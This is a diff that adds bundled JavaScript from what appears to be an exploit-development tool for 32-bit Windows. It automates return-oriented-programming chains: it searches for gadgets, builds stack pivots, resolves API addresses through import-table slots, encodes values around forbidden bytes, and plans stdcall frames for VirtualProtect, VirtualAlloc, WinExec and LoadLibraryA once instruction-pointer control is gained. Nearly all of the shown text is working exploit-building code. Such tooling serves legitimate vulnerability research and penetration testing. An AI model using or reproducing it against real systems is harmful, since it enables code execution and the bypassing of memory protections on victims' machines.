+      unsatisfied.push("no `xchg eax, esp` / `mov esp, eax` pivot gadget");
+    if (unsatisfied.length > 0) {
+      return { steps: [], unsatisfied, gadgets: {}, placeholders: [], stackBytes: 0, success: false };
+    }
+    const valRegs = stores.map((s) => s.reg);
+    const memLoads = findMemLoads(index, valRegs);
+    const resolved = [];
+    for (const word of words2) {
+      if (word.derefSlot !== void 0) {
+        let done = false;
+        for (const load of memLoads) {
+          const store = stores.find((s) => s.reg === load.valReg);
+          if (!store)
+            continue;
+          const ptrPop = isBadcharFree3(word.derefSlot, bc) ? popFor(load.ptrReg) : void 0;
+          const ptrRecipe = ptrPop ? void 0 : (_a = solveValue(index, load.ptrReg, word.derefSlot, badchars, ["eax"])) != null ? _a : void 0;
+          if (!ptrPop && !ptrRecipe)
+            continue;
+          resolved.push({ word, store, reg: load.valReg, deref: { memLoad: load.gadget, ptrReg: load.ptrReg, ptrPop, ptrRecipe, slot: word.derefSlot } });
+          done = true;
+          break;
+        }
+        if (!done)
+          unsatisfied.push(`no \`mov <valreg>, [ptr] ; ret\` + settable pointer to deref ${hex(word.derefSlot)} for ${word.comment}`);
+      } else if (word.placeholder || word.value !== void 0 && isBadcharFree3(word.value, bc)) {
+        const store = stores.find((s) => popFor(s.reg) !== void 0);
+        if (!store) {
+          unsatisfied.push(`no store+pop for ${word.comment}`);
+          continue;
+        }
+        resolved.push({ word, store, reg: store.reg, pop: popFor(store.reg) });
+      } else {
+        let done = false;
+        for (const store of stores) {
+          const recipe = solveValue(index, store.reg, word.value, badchars, ["eax"]);
+          if (recipe) {
+            resolved.push({ word, store, reg: store.reg, recipe });
+            done = true;
+            break;
+          }
+        }
+        if (!done)
+          unsatisfied.push(`cannot build any of [${stores.map((s) => s.reg).join(", ")}] = ${hex(word.value)} for ${word.comment} while preserving eax`);
+      }
+    }
+    if (unsatisfied.length > 0) {
+      return { steps: [], unsatisfied, gadgets: {}, placeholders: [], stackBytes: 0, success: false };
+    }
+    const steps = [];
+    const setEax = (word, comment) => {
+      steps.push(gadgetStep2(popEax, "pop eax"));
+      if (word.placeholder) {
+        placeholders.add(word.placeholder);
+        steps.push({ kind: "value", placeholder: word.placeholder, comment });
+      } else {
+        steps.push({ kind: "value", value: word.value >>> 0, comment });
+      }
+      steps.push(...retImmPadding(retImmBytes(popEax)));
+    };
+    setEax(bufAddress, `eax = BUF ${(_b = bufAddress.placeholder) != null ? _b : hex(bufAddress.value)}`);
+    resolved.forEach((r, i) => {
+      if (i > 0) {
+        steps.push(gadgetStep2(advance.gadget, `add eax, 4 -> BUF+0x${(i * 4).toString(16)}`));
+        for (let k = 0; k < advance.junkPops; k++) {
+          steps.push({ kind: "value", value: 1094795585, comment: "junk (advance side-effect pop)" });
+        }
+        steps.push(...retImmPadding(retImmBytes(advance.gadget)));
+      }
+      if (r.deref) {
+        if (r.deref.ptrPop) {
+          steps.push(gadgetStep2(r.deref.ptrPop, `pop ${r.deref.ptrReg}`));
+          steps.push({ kind: "value", value: r.deref.slot >>> 0, comment: `${r.deref.ptrReg} = ${hex(r.deref.slot)} (IAT slot of ${r.word.comment})` });
+          steps.push(...retImmPadding(retImmBytes(r.deref.ptrPop)));
+        } else {
+          steps.push(...r.deref.ptrRecipe.steps);
+        }
+        steps.push(gadgetStep2(r.deref.memLoad, `mov ${r.reg}, [${r.deref.ptrReg}]  -> ${r.reg} = *${hex(r.deref.slot)} (${r.word.comment})`));
+        steps.push(...retImmPadding(retImmBytes(r.deref.memLoad)));
+      } else if (r.recipe) {
+        steps.push(...r.recipe.steps);
+      } else {
+        steps.push(gadgetStep2(r.pop, `pop ${r.reg}`));
+        if (r.word.placeholder) {
+          placeholders.add(r.word.placeholder);
+          steps.push({ kind: "value", placeholder: r.word.placeholder, comment: `${r.reg} = ${r.word.placeholder} (${r.word.comment})` });
+        } else {
+          steps.push({ kind: "value", value: r.word.value >>> 0, comment: `${r.reg} = ${hex(r.word.value)} (${r.word.comment})` });
+        }
+        steps.push(...retImmPadding(retImmBytes(r.pop)));
+      }
+      steps.push(gadgetStep2(r.store.gadget, `mov [eax], ${r.reg}  -> BUF+0x${(i * 4).toString(16)} = ${r.word.comment}`));
+      steps.push(...retImmPadding(retImmBytes(r.store.gadget)));
+    });
+    setEax(bufAddress, `eax = BUF ${(_c = bufAddress.placeholder) != null ? _c : hex(bufAddress.value)} (for pivot)`);
+    steps.push(gadgetStep2(pivot, "xchg eax, esp  -> ESP = BUF; ret dispatches into BUF[0]"));
+    steps.push(...retImmPadding(retImmBytes(pivot)));
+    return {
+      steps: fixRetImmPadding(steps),
+      unsatisfied,
+      gadgets: {
+        store: firstKnownAddress(resolved[0].store.gadget),
+        advance: advance ? firstKnownAddress(advance.gadget) : void 0,
+        pivot: firstKnownAddress(pivot),
+        popEax: firstKnownAddress(popEax)
+      },
+      placeholders: [...placeholders],
+      stackBytes: steps.length * 4,
+      success: true
+    };
+  }
+  function hex(value) {
+    return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+
+  // src/rop/slot_dispatch.ts
+  var REGS = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp"];
+  function op2(g, i, n) {
+    var _a, _b;
+    return ((_b = (_a = g.instructions[i]) == null ? void 0 : _a.operands[n]) != null ? _b : "").trim().toLowerCase();
+  }
+  function lastIsRet2(g) {
+    var _a;
+    return ((_a = g.instructions[g.instructions.length - 1]) == null ? void 0 : _a.mnemonic) === "ret";
+  }
+  function pickBest2(cands) {
+    return [...cands].filter((g) => firstKnownAddress(g) !== void 0).sort((a, b) => {
+      const sa = isAddressStable(firstKnownAddress(a)) ? 0 : 1;
+      const sb = isAddressStable(firstKnownAddress(b)) ? 0 : 1;
+      if (sa !== sb)
+        return sa - sb;
+      if (a.instructions.length !== b.instructions.length)
+        return a.instructions.length - b.instructions.length;
+      if (retImmBytes(a) !== retImmBytes(b))
+        return retImmBytes(a) - retImmBytes(b);
+      return b.score - a.score;
+    })[0];
+  }
+  function findPop(index, reg) {
+    return pickBest2(index.gadgets.filter((g) => g.instructions.length === 2 && g.instructions[0].mnemonic === "pop" && op2(g, 0, 0) === reg && lastIsRet2(g)));
+  }
+  function findMemLoad(index, valReg, ptrReg) {
+    return pickBest2(index.gadgets.filter((g) => g.instructions.length === 2 && g.instructions[0].mnemonic === "mov" && lastIsRet2(g) && op2(g, 0, 0) === valReg && new RegExp(`\\[${ptrReg}\\]$`).test(op2(g, 0, 1))));
+  }
+  function findJmp(index, reg) {
+    return pickBest2(index.gadgets.filter((g) => {
+      var _a;
+      return ((_a = g.instructions[0]) == null ? void 0 : _a.mnemonic) === "jmp" && op2(g, 0, 0) === reg;
+    }));
+  }
+  function stableCount(chain) {
+    return [chain.popPtr, chain.deref, chain.dispatch].filter((g) => isAddressStable(firstKnownAddress(g))).length;
+  }
+  function findDerefChain(index) {
+    const candidates2 = [];
+    for (const valReg of REGS) {
+      const dispatch = findJmp(index, valReg);
+      if (!dispatch)
+        continue;
+      for (const ptrReg of REGS) {
+        const deref = findMemLoad(index, valReg, ptrReg);
+        const popPtr = findPop(index, ptrReg);
+        if (deref && popPtr)
+          candidates2.push({ popPtr, deref, dispatch, ptrReg, valReg });
+      }
+    }
+    if (candidates2.length === 0)
+      return void 0;
+    return candidates2.sort((a, b) => {
+      if (stableCount(a) !== stableCount(b))
+        return stableCount(b) - stableCount(a);
+      const selfA = a.ptrReg === a.valReg ? 0 : 1;
+      const selfB = b.ptrReg === b.valReg ? 0 : 1;
+      if (selfA !== selfB)
+        return selfA - selfB;
+      const insA = a.popPtr.instructions.length + a.deref.instructions.length + a.dispatch.instructions.length;
+      const insB = b.popPtr.instructions.length + b.deref.instructions.length + b.dispatch.instructions.length;
+      if (insA !== insB)
+        return insA - insB;
+      return b.popPtr.score + b.deref.score + b.dispatch.score - (a.popPtr.score + a.deref.score + a.dispatch.score);
+    })[0];
+  }
+  function missingDerefParts(index) {
+    const missing = [];
+    const anyJmp = REGS.some((r) => findJmp(index, r));
+    const anyLoad = REGS.some((v) => REGS.some((p) => findMemLoad(index, v, p)));
+    if (!anyLoad)
+      missing.push("no `mov <reg>, [<reg>] ; ret` to dereference the IAT slot");
+    if (!anyJmp)
+      missing.push("no `jmp <reg>` to dispatch the dereferenced pointer");
+    if (anyLoad && anyJmp) {
+      missing.push("no register composes pop <ptr> + mov <val>,[<ptr>] + jmp <val> (deref/dispatch registers do not line up)");
+    }
+    return missing;
+  }
+  var FAIL = (unsatisfied) => ({
+    steps: [],
+    unsatisfied,
+    gadgets: {},
+    placeholders: [],
+    stackBytes: 0,
+    success: false,
+    dispatch: { slot: 0, unstable: [] }
+  });
+  function planSlotDispatch(index, bufAddress, slot, frame, badchars = [], preferStable, entrySkewBytes = 0) {
+    const prevHint = getStableAddressHint();
+    setStableAddressHint(preferStable != null ? preferStable : prevHint);
+    try {
+      const plan = planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable);
+      if (plan.success && entrySkewBytes > 0 && plan.steps.length > 0) {
+        const fillers = Math.floor(entrySkewBytes / 4);
+        const fillerSteps = Array.from({ length: fillers }, () => ({
+          kind: "value",
+          value: 1111638594,
+          comment: `entry-skew filler (vuln ret ${entrySkewBytes} compensation)`
+        }));
+        plan.steps = [plan.steps[0], ...fillerSteps, ...plan.steps.slice(1)];
+        plan.stackBytes = plan.steps.length * 4;
+      }
+      return plan;
+    } finally {
+      setStableAddressHint(prevHint);
+    }
+  }
+  function planSlotDispatchInner(index, bufAddress, slot, frame, badchars, preferStable) {
+    const chain = findDerefChain(index);
+    const missing = [];
+    if (!chain)
+      missing.push(...missingDerefParts(index));
+    if (frame.length === 0)
+      missing.push("no frame words (need at least a return target)");
+    if (!chain || missing.length > 0)
+      return FAIL(missing);
+    const popAddr = firstKnownAddress(chain.popPtr);
+    const derefAddr = firstKnownAddress(chain.deref);
+    const jmpAddr = firstKnownAddress(chain.dispatch);
+    const unstable = [];
+    if (!isAddressStable(popAddr))
+      unstable.push(`pop ${chain.ptrReg} @ ${hex2(Number(popAddr))}`);
+    if (!isAddressStable(derefAddr))
+      unstable.push(`mov ${chain.valReg},[${chain.ptrReg}] @ ${hex2(Number(derefAddr))}`);
+    if (!isAddressStable(jmpAddr))
+      unstable.push(`jmp ${chain.valReg} @ ${hex2(Number(jmpAddr))}`);
+    const words2 = [
+      { value: Number(popAddr) >>> 0, comment: `pop ${chain.ptrReg} ; ret (deref preamble)` },
+      { value: slot >>> 0, comment: `IAT slot ${hex2(slot)}` },
+      { value: Number(derefAddr) >>> 0, comment: `mov ${chain.valReg},[${chain.ptrReg}] ; ret (deref -> live API)` },
+      { value: Number(jmpAddr) >>> 0, comment: `jmp ${chain.valReg} (dispatch)` },
+      ...frame
+    ];
+    const plan = planWriteFrame(index, bufAddress, words2, badchars, preferStable);
+    return __spreadProps(__spreadValues({}, plan), {
+      dispatch: {
+        popPtr: popAddr,
+        deref: derefAddr,
+        jmp: jmpAddr,
+        ptrReg: chain.ptrReg,
+        valReg: chain.valReg,
+        slot: slot >>> 0,
+        unstable
+      }
+    });
+  }
+  function hex2(value) {
+    return `0x${(value >>> 0).toString(16).toUpperCase().padStart(8, "0")}`;
+  }
+
+  // src/rop/api_plan.ts
+  function dwordIsByteSafe(value, badchars) {
+    const bad = new Set(badchars.map((byte) => byte & 255));
+    const word = Number(__bi.and(value, __bi(4294967295))) >>> 0;
+    for (let shift = 0; shift < 32; shift += 8) {
+      if (bad.has(word >>> shift & 255))
+        return false;
+    }
+    return true;
+  }
+  function sameModule(left, right) {
+    const normalize = (name) => name.toLowerCase().replace(/\.dll$/, "");
+    return left !== void 0 && normalize(left) === normalize(right);
+  }
+  function planApiResolution(target, imports, badchars = []) {
+    const candidates2 = [];
+    for (const entry of imports) {
+      const pointerResolved = entry.pointer !== __bi(0);
+      const targetModuleVerified = sameModule(entry.actualModule, target.module) && entry.actualModuleBase !== void 0;
+      const exactExport = entry.pointer === target.address;
+      const slotPayloadSafe = dwordIsByteSafe(entry.slot, badchars);
+      const base = {
+        target,
+        ownerModule: entry.ownerModule,
+        ownerBase: entry.ownerBase,
+        ownerImageBase: entry.ownerImageBase,
+        slot: entry.slot,
+        pointer: entry.pointer,
+        slotPayloadSafe,
+        pointerResolved,
+        targetModuleVerified
+      };
+      if (entry.importedSymbol.toLowerCase() === target.symbol.toLowerCase()) {
+        const exportRvaVerified = targetModuleVerified && exactExport;
+        candidates2.push(__spreadProps(__spreadValues({}, base), {
+          strategy: "direct-slot",
+          state: exportRvaVerified && slotPayloadSafe ? "ENCODABLE" : exportRvaVerified ? "ADDRESS_VALIDATED" : "DISCOVERED",
+          exportRvaVerified,
+          recommendation: slotPayloadSafe ? "Use rop.slot_call subject to corpus feasibility." : "Direct slot is validated but cannot be embedded; requires address construction."
+        }));
+        continue;
+      }
+      const anchorExact = entry.nearestOffset === __bi(0) && !!entry.nearestSymbol;
+      if (!targetModuleVerified || !anchorExact || !pointerResolved)
+        continue;
+      const delta = __bi.and(target.address - entry.pointer, __bi(4294967295));
+      candidates2.push(__spreadProps(__spreadValues({}, base), {
+        strategy: "derived-address",
+        state: slotPayloadSafe ? "ENCODABLE" : "ADDRESS_VALIDATED",
+        exportRvaVerified: true,
+        anchor: { symbol: entry.nearestSymbol, pointer: entry.pointer, delta },
+        recommendation: slotPayloadSafe ? "Candidate for gadget feasibility analysis; no chain has been constructed." : "Anchor is validated but its slot requires address construction before gadget feasibility analysis."
+      }));
+    }
+    return candidates2.sort((left, right) => {
+      const strategy = left.strategy === right.strategy ? 0 : left.strategy === "direct-slot" ? -1 : 1;
+      if (strategy !== 0)
+        return strategy;
+      if (left.slotPayloadSafe !== right.slotPayloadSafe)
+        return left.slotPayloadSafe ? -1 : 1;
+      return Number(left.slot - right.slot);
+    });
+  }
+
+  // src/rop/api_build.ts
+  function op3(gadget, instruction, operand) {
+    var _a, _b;
+    return ((_b = (_a = gadget.instructions[instruction]) == null ? void 0 : _a.operands[operand]) != null ? _b : "").trim().toLowerCase();
+  }
+  function isRetTerminated(gadget) {
+    return retImmBytes(gadget) >= 0 && firstKnownAddress(gadget) !== void 0;
+  }
+  function writes(gadget) {
+    const result3 = /* @__PURE__ */ new Set();
+    for (const instruction of gadget.instructions) {
+      const mnemonic = instruction.mnemonic.toLowerCase();
+      const destination = op3(gadget, gadget.instructions.indexOf(instruction), 0);
+      if (["pop", "mov", "add", "sub", "adc", "sbb", "xor", "or", "and", "not", "neg", "inc", "dec", "xchg"].includes(mnemonic) && /^[a-z]{2,3}$/.test(destination))
+        result3.add(destination);
+      if (mnemonic === "xchg" && /^[a-z]{2,3}$/.test(op3(gadget, gadget.instructions.indexOf(instruction), 1))) {
+        result3.add(op3(gadget, gadget.instructions.indexOf(instruction), 1));
+      }
+    }
+    return [...result3];
+  }
+  function pick(index, predicate, preserve, output) {
+    return index.gadgets.filter((gadget) => isRetTerminated(gadget) && predicate(gadget)).filter((gadget) => writes(gadget).every((reg) => reg === output || !preserve.has(reg))).sort((left, right) => retImmBytes(left) - retImmBytes(right) || left.instructions.length - right.instructions.length || right.score - left.score)[0];
+  }
+  function pickPop(index, register2, preserve, output) {
+    return pick(index, (gadget) => gadget.instructions.length === 2 && gadget.instructions[0].mnemonic === "pop" && op3(gadget, 0, 0) === register2, preserve, output);
+  }
+  function pickLoad(index, output, preserve) {
+    return pick(index, (gadget) => gadget.instructions.length === 2 && gadget.instructions[0].mnemonic === "mov" && op3(gadget, 0, 0) === output && op3(gadget, 0, 1) === `[${output}]`, preserve, output);
+  }
+  function pickAdd(index, output, source, preserve) {
+    return pick(index, (gadget) => gadget.instructions.length >= 2 && gadget.instructions[0].mnemonic === "add" && op3(gadget, 0, 0) === output && op3(gadget, 0, 1) === source, preserve, output);
+  }
+  function addends(delta, badchars) {
+    const word = Number(__bi.and(delta, __bi(4294967295))) >>> 0;
+    if (dwordIsByteSafe(__bi(word), badchars))
+      return [word];
+    for (let byte = 1; byte < 256; byte += 1) {
+      const component = (byte << 24 | byte << 16 | byte << 8 | byte) >>> 0;
+      const second = word - component >>> 0;
+      if (dwordIsByteSafe(__bi(component), badchars) && dwordIsByteSafe(__bi(second), badchars))
+        return [component, second];
+    }
+    return void 0;
+  }
+  function buildApiResolution(index, candidate, options = {}) {
+    var _a, _b, _c, _d;
+    const output = ((_a = options.output) != null ? _a : "eax").toLowerCase();
+    const preserve = new Set(((_b = options.preserve) != null ? _b : []).map((reg) => reg.toLowerCase()));
+    const badchars = (_c = options.badchars) != null ? _c : [];
+    const maxGadgets = (_d = options.maxGadgets) != null ? _d : 12;
+    const unsatisfied = [];
+    const notes = [];
+    if (output !== "eax")
+      return { state: "UNSATISFIED", strategy: candidate.strategy, steps: [], gadgetCount: 0, stackBytes: 0, clobbers: [], unsatisfied: ["Phase 2 currently supports EAX output only."], notes };
+    if (!candidate.exportRvaVerified || !candidate.pointerResolved || !candidate.targetModuleVerified) {
+      return { state: "UNSATISFIED", strategy: candidate.strategy, steps: [], gadgetCount: 0, stackBytes: 0, clobbers: [], unsatisfied: ["Phase 1 address evidence is incomplete; rebuild from a validated candidate."], notes };
+    }
+    if (options.continuation === void 0)
+      unsatisfied.push("A concrete continuation address is required after the final RET.");
+    if (options.continuation !== void 0 && !dwordIsByteSafe(__bi(options.continuation), badchars))
+      unsatisfied.push("Continuation address contains a forbidden byte.");
+    const popEax = pickPop(index, "eax", preserve, output);
+    const loadEax = pickLoad(index, output, preserve);
+    if (!popEax)
+      unsatisfied.push("No exact `pop eax ; ret` gadget satisfies preservation constraints.");
+    if (!loadEax)
+      unsatisfied.push("No exact `mov eax, [eax] ; ret` gadget satisfies preservation constraints.");
+    const operations = [];
+    if (popEax && loadEax) {
+      if (!candidate.slotPayloadSafe)
+        unsatisfied.push("IAT slot contains a forbidden byte; dynamic slot-address construction is not implemented in this milestone.");
+      else {
+        operations.push({ gadget: popEax, operand: Number(candidate.slot), comment: `pop eax = IAT slot 0x${candidate.slot.toString(16).toUpperCase()}` });
+        operations.push({ gadget: loadEax, comment: "mov eax, [eax] (live IAT target)" });
+      }
+    }
+    if (candidate.strategy === "derived-address") {
+      const components = candidate.anchor ? addends(candidate.anchor.delta, badchars) : void 0;
+      if (!components)
+        unsatisfied.push("No one- or two-addend byte-safe displacement decomposition was found.");
+      const popEbp = pickPop(index, "ebp", preserve, output);
+      const addEaxEbp = pickAdd(index, output, "ebp", preserve);
+      if (!popEbp)
+        unsatisfied.push("No exact `pop ebp ; ret` gadget satisfies preservation constraints.");
+      if (!addEaxEbp)
+        unsatisfied.push("No `add eax, ebp ; ... ; ret` gadget satisfies preservation constraints.");
+      if (components && popEbp && addEaxEbp) {
+        for (const component of components) {
+          operations.push({ gadget: popEbp, operand: component, comment: `pop ebp = 0x${component.toString(16).toUpperCase().padStart(8, "0")}` });
+          operations.push({ gadget: addEaxEbp, comment: "add eax, ebp" });
+        }
+        notes.push(`Displacement encoded as ${components.map((value) => `0x${value.toString(16).toUpperCase().padStart(8, "0")}`).join(" + ")}.`);
+      }
+    }
+    if (operations.length > maxGadgets)
+      unsatisfied.push(`Construction needs ${operations.length} gadgets; maxGadgets is ${maxGadgets}.`);
+    for (const operation of operations) {
+      const address = firstKnownAddress(operation.gadget);
+      if (!dwordIsByteSafe(address, badchars))
+        unsatisfied.push(`Gadget address 0x${address.toString(16).toUpperCase()} contains a forbidden byte.`);
+      if (retImmBytes(operation.gadget) % 4 !== 0)
+        unsatisfied.push(`Gadget at 0x${address.toString(16).toUpperCase()} has ret ${retImmBytes(operation.gadget)}, which cannot be represented by DWORD stack padding.`);
+      if (operation.operand !== void 0 && !dwordIsByteSafe(__bi(operation.operand), badchars)) {
+        unsatisfied.push(`Operand 0x${operation.operand.toString(16).toUpperCase()} contains a forbidden byte.`);
+      }
+    }
+    if (unsatisfied.length > 0)
+      return { state: "UNSATISFIED", strategy: candidate.strategy, steps: [], gadgetCount: operations.length, stackBytes: 0, clobbers: [], unsatisfied, notes };
+    const steps = [];
+    const clobbers = /* @__PURE__ */ new Set();
+    let pendingPadding = 0;
+    for (const operation of operations) {
+      steps.push({ kind: "gadget", address: firstKnownAddress(operation.gadget), comment: operation.comment });
+      for (let word = 0; word < pendingPadding; word += 1)
+        steps.push({ kind: "value", value: 1094795585, comment: "ret immediate padding" });
+      pendingPadding = retImmBytes(operation.gadget) / 4;
+      if (operation.operand !== void 0)
+        steps.push({ kind: "value", value: operation.operand, comment: operation.comment });
+      for (const reg of writes(operation.gadget))
+        if (reg !== output)
+          clobbers.add(reg);
+    }
+    steps.push({ kind: "value", value: options.continuation, comment: "required continuation after API resolution" });
+    for (let word = 0; word < pendingPadding; word += 1)
+      steps.push({ kind: "value", value: 1094795585, comment: "ret immediate padding" });
+    return {
+      state: "CHAIN_CONSTRUCTED",
+      strategy: candidate.strategy,
+      steps,
+      gadgetCount: operations.length,
+      stackBytes: steps.length * 4,
+      clobbers: [...clobbers].sort(),
+      expectedOutput: candidate.target.address,
+      unsatisfied: [],
+      notes
+    };
+  }
+  function buildBestApiResolution(index, candidates2, options = {}) {
+    var _a;
+    const attempts = candidates2.map((candidate) => {
+      if (!candidate.exportRvaVerified || !candidate.pointerResolved || !candidate.targetModuleVerified) {
+        return { candidate, rejectionReasons: ["Phase 1 address evidence is incomplete."] };
+      }
+      const plan = buildApiResolution(index, candidate, options);
+      return { candidate, plan, rejectionReasons: plan.state === "CHAIN_CONSTRUCTED" ? [] : plan.unsatisfied };
+    });
+    const successful = attempts.filter((attempt) => {
+      var _a2;
+      return ((_a2 = attempt.plan) == null ? void 0 : _a2.state) === "CHAIN_CONSTRUCTED";
+    });
+    successful.sort((left, right) => left.plan.gadgetCount - right.plan.gadgetCount || left.plan.stackBytes - right.plan.stackBytes || left.plan.clobbers.length - right.plan.clobbers.length);
+    const selected = (_a = successful[0]) != null ? _a : attempts.find((attempt) => attempt.plan !== void 0);
+    return selected ? { candidate: selected.candidate, plan: selected.plan, attempts } : { attempts };
+  }
+
+  // src/rop/planner.ts
+  var STDCALL_ARG_COUNT = {
+    VirtualProtect: 4,
+    VirtualAlloc: 4,
+    WriteProcessMemory: 5,
+    VirtualProtectEx: 5,
+    VirtualAllocEx: 5,
+    WinExec: 2,
+    LoadLibraryA: 1,
+    GetProcAddress: 2
+  };
+  var STRATEGY_NAMES = /* @__PURE__ */ new Map([
+    ["virtualprotect", "VirtualProtect"],
+    ["virtualalloc", "VirtualAlloc"],
+    ["writeprocessmemory", "WriteProcessMemory"],
+    ["virtualprotectex", "VirtualProtectEx"],
+    ["virtualallocex", "VirtualAllocEx"],
+    ["winexec", "WinExec"],
+    ["loadlibrarya", "LoadLibraryA"],
+    ["loadlibrary", "LoadLibraryA"],
+    ["getprocaddress", "GetProcAddress"],
+    ["stackpivot", "Stack Pivot"],
+    ["stack pivot", "Stack Pivot"]
+  ]);
+  function unique(values) {
+    return [...new Set(values)];
+  }
+  function definitionsFor(strategy) {
+    const apiName = strategy === "Stack Pivot" ? "continuation" : strategy;
+    if (strategy === "Stack Pivot") {
+      return [
+        {
+          shape: "STACK_PIVOT_FRAME",
+          complexity: "LOW",
+          required: ["STACK_PIVOT", "DISPATCH_RET"],
+          assumptions: [],
+          preconditions: [
+            "A controlled, writable memory region can hold the continuation frame.",
+            "The pivot source register or memory contains a valid pointer to the controlled region."
+          ],
+          iatExempt: true
+        }
+      ];
+    }
+    return [
+      {
+        shape: "SYNTHETIC_STDCALL_FRAME",
+        complexity: "LOW",
+        required: ["DISPATCH_RET"],
+        assumptions: [],
+        preconditions: [
+          "EIP is controlled (e.g. via SEH overwrite or saved return address).",
+          `ESP points to or can reach a region with ${(STDCALL_ARG_COUNT[strategy] + 2) * 4}+ contiguous controlled bytes.`,
+          `${apiName} address is known or resolvable at exploit time.`,
+          "All frame values are encodable under the current charset."
+        ],
+        iatExempt: true
+      },
+      {
+        shape: "STACK_PIVOT_FRAME",
+        complexity: "LOW",
+        required: ["STACK_PIVOT", "DISPATCH_RET"],
+        assumptions: [],
+        preconditions: [
+          "A controlled, writable memory region can hold the synthetic frame.",
+          "The pivot source register or memory contains a valid pointer to the controlled region.",
+          `${apiName} address is known or resolvable at exploit time.`
+        ],
+        iatExempt: true
+      },
+      {
+        shape: "RET_DISPATCH",
+        complexity: "LOW",
+        required: ["DISPATCH_RET"],
+        assumptions: [],
+        preconditions: [
+          "ESP points to a controlled region large enough for the stdcall frame.",
+          `${apiName} address is encodable and placed at ESP when ret executes.`,
+          "Stdcall arguments follow the API address on the stack."
+        ],
+        iatExempt: true
+      },
+      {
+        shape: "PUSHAD_DISPATCH",
+        complexity: "MEDIUM",
+        required: ["LOAD_CONSTANT", "DISPATCH_PUSHAD"],
+        assumptions: [],
+        preconditions: [
+          "Registers can be loaded with the required API arguments via pop gadgets.",
+          `The PUSHAD stack layout matches the ${apiName} stdcall ABI.`,
+          "ESP at pushad time points into the shellcode or NOP sled (used as lpAddress)."
+        ]
+      },
+      {
+        shape: "CALL_REGISTER",
+        complexity: "HIGH",
+        required: ["LOAD_CONSTANT", "DISPATCH_CALL_REGISTER"],
+        assumptions: [],
+        preconditions: [
+          `The API address must be loaded into the dispatch register before call.`,
+          `A valid stdcall frame for ${apiName} must exist at [ESP] when call executes (return addr is pushed by call).`,
+          "The call target must not clobber registers or stack state needed by the API."
+        ]
+      },
+      {
+        shape: "JMP_REGISTER",
+        complexity: "HIGH",
+        required: ["LOAD_CONSTANT", "DISPATCH_JMP_REGISTER"],
+        assumptions: [],
+        preconditions: [
+          `The API address must be loaded into the dispatch register before jmp.`,
+          `ESP must point to: [RETURN_ADDR][arg1][arg2]... since jmp does not push a return address.`,
+          `The full ${apiName} stdcall frame must already be on the stack.`
+        ]
+      }
+    ];
+  }
+  function normalizeExploitStrategy(value) {
+    return STRATEGY_NAMES.get(value.trim().toLowerCase());
+  }
+  function availableCapabilityKinds(index) {
+    return unique(index.gadgets.flatMap((gadget) => gadget.capabilities.map((capability2) => capability2.kind))).sort();
+  }
+  function planExploitStrategy(index, request, planId = 1) {
+    var _a;
+    const apiResolution = (_a = request.apiResolution) != null ? _a : "direct";
+    const available = availableCapabilityKinds(index);
+    const availableSet = new Set(available);
+    const definitions = definitionsFor(request.strategy);
+    const strategies = definitions.map((definition, offset) => {
+      const required = unique([
+        ...definition.required,
+        ...apiResolution === "iat" && !definition.iatExempt ? ["LOAD_MEMORY"] : []
+      ]);
+      const satisfied = required.filter((capability2) => availableSet.has(capability2));
+      const missing = required.filter((capability2) => !availableSet.has(capability2));
+      const hasPreconditions = definition.preconditions.length > 0;
+      return {
+        id: offset + 1,
+        shape: definition.shape,
+        possible: missing.length === 0,
+        feasibility: missing.length === 0 && hasPreconditions ? "exploit-state-dependent" : missing.length === 0 ? "capability-feasible" : "exploit-state-dependent",
+        recommended: false,
+        complexity: definition.complexity,
+        required,
+        satisfied,
+        missing,
+        assumptions: definition.assumptions,
+        preconditions: definition.preconditions,
+        reason: missing.length === 0 ? "All required capabilities present. Exploit-state preconditions must be verified." : `Missing semantic capabilities: ${missing.join(", ")}.`
+      };
+    });
+    const recommendation = strategies.find((strategy) => strategy.possible);
+    if (recommendation) {
+      recommendation.recommended = true;
+    }
+    return {
+      id: planId,
+      strategy: request.strategy,
+      apiResolution,
+      corpusCapabilities: available,
+      strategies
+    };
+  }
+  function strategyPlanRows(plan) {
+    return plan.strategies.map((strategy) => ({
+      Plan: plan.id.toString(),
+      Strategy: plan.strategy,
+      Shape: strategy.shape,
+      Possible: strategy.possible ? "yes" : "no",
+      Feasibility: strategy.possible ? strategy.feasibility : "",
+      Recommended: strategy.recommended ? "yes" : "",
+      Complexity: strategy.complexity,
+      Required: strategy.required.join(", "),
+      Satisfied: strategy.satisfied.join(", "),
+      Missing: strategy.missing.join(", "),
+      Preconditions: strategy.preconditions.join(" | "),
+      Reason: strategy.reason
+    }));
+  }
+
+  // src/rop/emitter.ts
+  function knownAddress(gadget) {
+    var _a;
+    const location = gadget.locations.find((candidate) => candidate.virtualAddress !== void 0);
+    return (location == null ? void 0 : location.virtualAddress) === void 0 ? void 0 : { address: __bi(location.virtualAddress), module: (_a = location.module) != null ? _a : "unknown" };
+  }
+  function exactStackDelta(gadget) {
+    const values = [...gadget.semanticSummary.summary.stackDelta.values.exact];
+    return values.length === 1 ? values[0] : void 0;
+  }
+  function sideEffectCount(gadget) {
+    const summary = gadget.semanticSummary.summary;
+    return summary.writes.values.exact.size + summary.writes.values.conservative.size + summary.memoryReads.values.exact.size + summary.memoryReads.values.conservative.size + (summary.memoryWrites.values.exact.size + summary.memoryWrites.values.conservative.size) * 2;
+  }
+  function rankCandidates(gadgets) {
+    return gadgets.filter((gadget) => knownAddress(gadget) !== void 0).sort((left, right) => {
+      var _a, _b;
+      const sideEffectDifference = sideEffectCount(left) - sideEffectCount(right);
+      if (sideEffectDifference !== 0)
+        return sideEffectDifference;
+      const stackDifference = ((_a = exactStackDelta(left)) != null ? _a : Number.MAX_SAFE_INTEGER) - ((_b = exactStackDelta(right)) != null ? _b : Number.MAX_SAFE_INTEGER);
+      if (stackDifference !== 0)
+        return stackDifference;
+      const lengthDifference = left.instructions.length - right.instructions.length;
+      return lengthDifference !== 0 ? lengthDifference : right.score - left.score;
+    });
+  }
+  var RankedSemanticEmitter = class {
+    emit(index, plan, strategyId) {
+      const strategy = strategyId === void 0 ? plan.strategies.find((candidate) => candidate.recommended) : plan.strategies.find((candidate) => candidate.id === strategyId);
+      if (!strategy) {
+        return {
+          planId: plan.id,
+          strategy: plan.strategy,
+          strategyId: strategyId != null ? strategyId : 0,
+          shape: "RET_DISPATCH",
+          success: false,
+          gadgets: [],
+          missing: [],
+          diagnostics: ["No matching or recommended strategy exists for this plan."]
